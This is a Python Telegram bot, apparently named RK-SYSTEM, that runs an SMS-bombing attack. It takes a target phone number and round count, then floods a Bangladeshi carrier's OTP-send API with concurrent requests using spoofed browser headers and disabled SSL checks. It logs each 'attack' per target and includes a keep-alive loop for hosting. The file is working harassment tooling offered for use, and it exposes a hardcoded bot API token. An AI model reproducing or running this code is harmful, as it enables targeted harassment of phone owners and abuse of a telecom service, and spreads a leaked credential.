import telebot
import requests
import asyncio
import aiohttp
import threading
import time
import json
import os
import pytz
from datetime import datetime
from telebot import types
from flask import Flask

# ---------- WEB SERVER FOR RENDER ----------
app = Flask(__name__)

@app.route('/')
def home():
    return "RK-SYSTEM IS LIVE!"

def run_web():
    app.run(host='0.0.0.0', port=10000)

# ---------- CONFIG ----------
API_TOKEN = '8519607285:AAFFBo2m3QiMmh00MUzt3Q6DbVWAipa5INg'
bot = telebot.TeleBot(API_TOKEN)

BD_TZ = pytz.timezone('Asia/Dhaka')
HISTORY_FILE = "bombing_history.json"
WAKEUP_URL = "https://rksystemx.onrender.com/"

# ---------- DATA STORAGE ----------
def load_history():
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, "r") as f:
                return json.load(f)
        except: return {}
    return {}

def save_history(data):
    with open(HISTORY_FILE, "w") as f:
        json.dump(data, f, indent=4)

user_data = {}
history_db = load_history()

# ---------- HIGH POWER SIM API ----------
async def fire_sim_api(session, target):
    url = "https://api.robi.com.bd/robi-api/v1/otp/send"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Origin": "https://www.robi.com.bd",
        "Referer": "https://www.robi.com.bd/"
    }
    payload = {"msisdn": target}
    try:
        async with session.post(url, json=payload, headers=headers, timeout=10, ssl=False) as resp:
            return resp.status in [200, 201, 202]
    except:
        return False

# ---------- BOMBING ENGINE ----------
def run_async_bomb(chat_id, phone, amount, msg_id):
    asyncio.run(bomb_task(chat_id, phone, amount, msg_id))

async def bomb_task(chat_id, phone, amount, msg_id):
    success, failed = 0, 0
    start_time = datetime.now(BD_TZ)
    user_data[chat_id] = {'status': 'running', 'round': 0, 'start_time': start_time, 'success': 0, 'failed': 0}

    connector = aiohttp.TCPConnector(limit=100, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        for r in range(1, amount + 1):
            if user_data.get(chat_id, {}).get('status') == 'stopped': break
            
            tasks = [fire_sim_api(session, phone) for _ in range(5)]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res: success += 1
                else: failed += 1

            user_data[chat_id].update({'success': success, 'failed': failed, 'round': r})
            running_time = str(datetime.now(BD_TZ) - start_time).split('.')[0]
            update_bombing_ui(chat_id, phone, amount, msg_id, running_time)
            await asyncio.sleep(0.3)

    # History Save
    log_time = datetime.now(BD_TZ).strftime('%d/%m/%y | %I:%M %p')
    log_entry = f"🕒 {log_time} | ✅ {success} | ❌ {failed} | Rounds: {amount}"
    uid = str(chat_id)
    if uid not in history_db: history_db[uid] = {}
    if phone not in history_db[uid]: history_db[uid][phone] = []
    history_db[uid][phone].append(log_entry)
    save_history(history_db)

    bot.edit_message_text(f"🏁 **MISSION COMPLETED**\n\n🎯 Target: `{phone}`\n✅ Success: `{success}`\n⏱ Time: `{str(datetime.now(BD_TZ)-start_time).split('.')[0]}`", chat_id, msg_id)

def update_bombing_ui(chat_id, phone, amount, msg_id, running_time):
    data = user_data[chat_id]
    text = (
        f"⚡ **RK-SYSTEM HIGH SPEED ATTACK** ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 Target: `{phone}`\n"
        f"🔄 Round: `[{data['round']}/{amount}]`\n"
        f"✅ Sent: `{data['success']}`\n"
        f"❌ Fail: `{data['failed']}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱ Running: `{running_time}`\n"
        f"🕒 Time: `{datetime.now(BD_TZ).strftime('%I:%M:%S %p')}`"
    )
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop"))
    try: bot.edit_message_text(text, chat_id, msg_id, reply_markup=markup, parse_mode="Markdown")
    except: pass

# ---------- HANDLERS & MENU ----------
@bot.message_handler(commands=['start', 'menu'])
def main_menu(message):
    chat_id = message.chat.id
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    # অনেকগুলো মেনু বাটন যোগ করা হয়েছে
    btn1 = types.InlineKeyboardButton("🚀 START ATTACK", callback_data="setup")
    btn2 = types.InlineKeyboardButton("📜 HISTORY", callback_data="history_main")
    btn3 = types.InlineKeyboardButton("👤 MY PROFILE", callback_data="profile")
    btn4 = types.InlineKeyboardButton("🛠 TOOLS", callback_data="tools")
    btn5 = types.InlineKeyboardButton("📡 SERVER STATUS", callback_data="status")
    btn6 = types.InlineKeyboardButton("ℹ️ ABOUT", callback_data="about")
    
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    
    welcome_text = (
        f"🔥 **RK-SYSTEM PREMIUM V4.0** 🔥\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"Welcome to the high-speed SIM bombing panel.\n"
        f"No login required! Start your mission below.\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🕒 BD Time: `{datetime.now(BD_TZ).strftime('%I:%M %p')}`"
    )
    bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    uid = str(chat_id)

    if call.data == "setup":
        msg = bot.send_message(chat_id, "📞 **Target নাম্বার দিন (১১ ডিজিট):**")
        bot.register_next_step_handler(msg, get_number)
    
    elif call.data == "history_main":
        if uid not in history_db or not history_db[uid]:
            bot.answer_callback_query(call.id, "History empty!")
            return
        markup = types.InlineKeyboardMarkup()
        for phone in history_db[uid].keys():
            markup.add(types.InlineKeyboardButton(f"📱 {phone}", callback_data=f"h_{phone}"))
        markup.add(types.InlineKeyboardButton("🏠 HOME", callback_data="home"))
        bot.edit_message_text("📜 **Attack History List:**", chat_id, call.message.message_id, reply_markup=markup)

    elif call.data.startswith("h_"):
        phone = call.data.split("_")[1]
        logs = history_db[uid][phone]
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⬅️ BACK", callback_data="history_main"),
                   types.InlineKeyboardButton("🏠 HOME", callback_data="home"))
        bot.edit_message_text(f"📜 **Logs for {phone}:**\n\n" + "\n".join(logs[-10:]), chat_id, call.message.message_id, reply_markup=markup)

    elif call.data == "home":
        bot.delete_message(chat_id, call.message.message_id)
        main_menu(call.message)

    elif call.data == "status":
        bot.answer_callback_query(call.id, "✅ Server is Running Smoothly!")

    elif call.data == "about":
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ BACK", callback_data="home"))
        bot.edit_message_text("🚀 **RK-SYSTEM PRO**\nVersion: 4.0\nDeveloper: RK-TEAM\nAPI: Robi/Airtel (SIM)", chat_id, call.message.message_id, reply_markup=markup)

    elif call.data == "confirm_attack":
        data = user_data[chat_id]
        bot.delete_message(chat_id, call.message.message_id)
        msg = bot.send_message(chat_id, "🚀 **Attack Initiated...**")
        threading.Thread(target=run_async_bomb, args=(chat_id, data['target'], data['amount'], msg.message_id)).start()

    elif call.data == "stop":
        user_data[chat_id]['status'] = "stopped"
        bot.answer_callback_query(call.id, "Stopped!")

def get_number(message):
    if not message.text.isdigit() or len(message.text) != 11:
        bot.reply_to(message, "❌ সঠিক নাম্বার দিন।")
        return
    user_data[message.chat.id] = {'target': message.text}
    msg = bot.send_message(message.chat.id, "📊 **কত রাউন্ড? (Max 100):**")
    bot.register_next_step_handler(msg, get_amount)

def get_amount(message):
    try:
        amount = min(int(message.text), 100)
        user_data[message.chat.id]['amount'] = amount
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ CONFIRM", callback_data="confirm_attack"),
                   types.InlineKeyboardButton("🏠 HOME", callback_data="home"))
        bot.send_message(message.chat.id, f"🎯 Target: `{user_data[message.chat.id]['target']}`\n📊 Rounds: `{amount}`\nনিশ্চিত করুন:", reply_markup=markup, parse_mode="Markdown")
    except: bot.reply_to(message, "❌ নাম্বার দিন।")

# ---------- WAKEUP ----------
def wakeup():
    while True:
        try: requests.get(WAKEUP_URL, timeout=10)
        except: pass
        time.sleep(600)

if __name__ == "__main__":
    threading.Thread(target=run_web, daemon=True).start()
    threading.Thread(target=wakeup, daemon=True).start()
    print("✅ RK-SYSTEM IS READY")
    bot.infinity_polling()
